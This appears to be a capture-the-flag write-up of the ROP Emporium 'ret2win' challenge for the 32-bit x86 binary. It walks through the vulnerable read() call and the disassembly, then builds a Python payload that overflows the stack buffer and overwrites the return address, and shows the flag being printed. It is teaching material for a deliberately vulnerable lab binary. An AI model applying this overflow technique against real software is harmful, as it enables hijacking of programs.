---
title: "ROP Emporium - ret2win"
categories: [Binary, Exploitation]
tags: [x86, x86_64, ARMv5, ARM, MIPS, ret2win]

---

## ret2win

**ret2win** (short for "return-to-win") challenges involve exploiting a buffer overflow to overwrite a function’s return address, redirecting execution to a hidden “win” or “ret2win” function that prints a flag.

The give binary has a `ret2win` function which we need to call. 

## x86 (`ret2win32`)

The binary contains a function called `pwnme`, which is vulnerable to a buffer overflow.

```c
int pwnme()
{
  _BYTE s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
  printf("> ");
  read(0, s, 0x38u);
  return puts("Thank you!");
}
```

The `ret2win` function is defined as:

```c
int ret2win()
{
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}
```

If you carefully look at the `pwnme` function, you'll notice it reads `0x38` bytes (which is `56` bytes) of user input into the buffer `s[40]`.  
Since this buffer is allocated on the stack, writing more data than it can hold causes a **stack overflow**.

Following is the disassembly of `pwnme`:

```bash
pwndbg> disass pwnme 
Dump of assembler code for function pwnme:
   0x080485ad <+0>:	push   ebp
   0x080485ae <+1>:	mov    ebp,esp
   0x080485b0 <+3>:	sub    esp,0x28
   0x080485b3 <+6>:	sub    esp,0x4
   0x080485b6 <+9>:	push   0x20
   0x080485b8 <+11>:	push   0x0
   0x080485ba <+13>:	lea    eax,[ebp-0x28]
   0x080485bd <+16>:	push   eax
   0x080485be <+17>:	call   0x8048410 <memset@plt>
   0x080485c3 <+22>:	add    esp,0x10
   0x080485c6 <+25>:	sub    esp,0xc
   0x080485c9 <+28>:	push   0x8048708
   0x080485ce <+33>:	call   0x80483d0 <puts@plt>
   0x080485d3 <+38>:	add    esp,0x10
   0x080485d6 <+41>:	sub    esp,0xc
   0x080485d9 <+44>:	push   0x8048768
   0x080485de <+49>:	call   0x80483d0 <puts@plt>
   0x080485e3 <+54>:	add    esp,0x10
   0x080485e6 <+57>:	sub    esp,0xc
   0x080485e9 <+60>:	push   0x8048788
   0x080485ee <+65>:	call   0x80483d0 <puts@plt>
   0x080485f3 <+70>:	add    esp,0x10
   0x080485f6 <+73>:	sub    esp,0xc
   0x080485f9 <+76>:	push   0x80487e8
   0x080485fe <+81>:	call   0x80483c0 <printf@plt>
   0x08048603 <+86>:	add    esp,0x10
   0x08048606 <+89>:	sub    esp,0x4
   0x08048609 <+92>:	push   0x38
   0x0804860b <+94>:	lea    eax,[ebp-0x28]
   0x0804860e <+97>:	push   eax
   0x0804860f <+98>:	push   0x0
   0x08048611 <+100>:	call   0x80483b0 <read@plt>
   0x08048616 <+105>:	add    esp,0x10
   0x08048619 <+108>:	sub    esp,0xc
   0x0804861c <+111>:	push   0x80487eb
   0x08048621 <+116>:	call   0x80483d0 <puts@plt>
   0x08048626 <+121>:	add    esp,0x10
   0x08048629 <+124>:	nop
   0x0804862a <+125>:	leave  
   0x0804862b <+126>:	ret  
```

Notice that `read@plt` receives its arguments via the stack, with arguments pushed **from right to left** as per the **x86 calling convention** (which we discussed earlier).

Now, let's set a breakpoint at `*pwnme + 100` (just before the `read` call):

```bash
pwndbg> b *pwnme + 100
Breakpoint 1 at 0x8048611
pwndbg> r
 ► 0x8048611 <pwnme+100>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/12)
        buf: 0xffffd500 ◂— 0
        nbytes: 0x38

```

Here, our buffer is located at `0xffffd500`, which corresponds to `[ebp-0x28]`.

This means:

- Writing beyond `0x28` bytes will **overwrite the saved `ebp`** (base pointer).
- Writing even further allows you to **overwrite the saved return address**, giving you control over program execution.

Before we dive deeper, let's first understand what **function prologue** and **epilogue** are. These are common patterns you’ll see in almost every function in low-level programming, especially in assembly or when analyzing binaries.

**Prologue**

The **function prologue** is the set of assembly instructions at the start of a function that prepares the **stack frame** for that function’s execution.

```txt
push rbp       ; Save caller’s RBP
mov rbp, rsp   ; RBP points to the current stack frame
sub  rsp, 0x20      ; Reserve 32 bytes for local variables
```

**Epilogue**

The **epilogue** cleans up the stack before returning from the function.

```txt
mov rsp, rbp     ; Reset stack pointer
pop rbp          ; Restore caller's frame pointer
ret              ; Pop return address from stack and jump there
```

You will find something like :

```txt
leave   ; shorthand for `mov rsp, rbp` + `pop rbp`
ret     ; Return to caller
```

By overwriting the return address with our desired address, we can control where the program jumps next. When the function executes the `ret` instruction, it will load our address into **EIP** and transfer execution there.

**Note:** In the stack diagram I’ve shown, the stack grows from **higher** to **lower** memory addresses (which is how stacks typically behave in most systems).

![Stack Diagram](/assets/img/x86.png)

Let’s craft an exploit to overwrite the return address and redirect execution.

Here’s a simple Python script to generate our payload:

```python
#!/usr/bin/python3
import sys

payload = b'A' * 0x28           # Fill buffer (40 bytes)
payload += b'B' * 0x4           # Overwrite saved EBP (4 bytes on 32-bit)
payload += b'C' * 0x4           # Overwrite saved return address (EIP)

sys.stdout.buffer.write(payload)

```

We’ll save this to a file and test it in **GDB**:

```bash
python exp.py > exp.txt

gdb ./ret2win32
pwndbg> r < exp.txt
```

Here’s what happens:

```bash
0x43434343 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────
 EAX  0xb
 EBX  0xf7f90000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 ECX  0xf7f919b4 (_IO_stdfile_1_lock) ◂— 0
 EDX  1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd604 —▸ 0xffffd7dc ◂— '/home/fury/Desktop/Challs/CTF/pwn/rop_emporium/1-ret2win/1-32bit/ret2win32'
 EBP  0x42424242 ('BBBB')
 ESP  0xffffd530 ◂— 1
 EIP  0x43434343 ('CCCC')
─────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────
Invalid address 0x43434343


```

Boom! We get a **segmentation fault**—as expected. The **EIP** is overwritten with `0x43434343` (`CCCC`), and the saved **EBP** is `0x42424242` (`BBBB`).

Now we just need to replace `CCCC` with the actual address of the `ret2win` function.

Let’s find its address:

```bash
nm ./ret2win32 | grep ret2win
0804862c t ret2win

```

Now we modify our script to use this address instead of `CCCC`:

```python
#!/usr/bin/python
import sys

payload = b'A'*0x28
payload += b'B'*0x4
#payload += b'C'*0x4
payload += b"\x08\x04\x86\x2c" # 0x0804862c
sys.stdout.buffer.write(payload)

```

Testing it in GDB:

```bash
python exp.py > exp.txt

gdb ./ret2win32
# ...
 EBP  0x42424242 ('BBBB')
 ESP  0xffffd530 ◂— 1
 EIP  0x2c860408
─────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────
Invalid address 0x2c860408

```

Hmm... We see that the value of **EIP** is `0x2c860408`, which is the exact reverse of `0x0804862c`. This happens because the **x86 architecture uses little-endian byte order**, meaning the least significant byte is stored first in memory.

Let’s correct our payload:

```python
#!/usr/bin/python3
import sys

payload = b'A'*0x28
payload += b'B'*0x4
#payload += b'C'*0x4
payload += b"\x2c\x86\x04\x08" # 0x0804862c  Correct little-endian address of ret2win
sys.stdout.buffer.write(payload)

```

Now we run our exploit:

```bash
./exp.py | ./ret2win32 
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)

```

Success! We’ve successfully called the `ret2win` function and captured the flag.

**Note:** After calling `ret2win`, we get a segmentation fault because the program continues execution beyond that point. We’ll cover why that happens later.

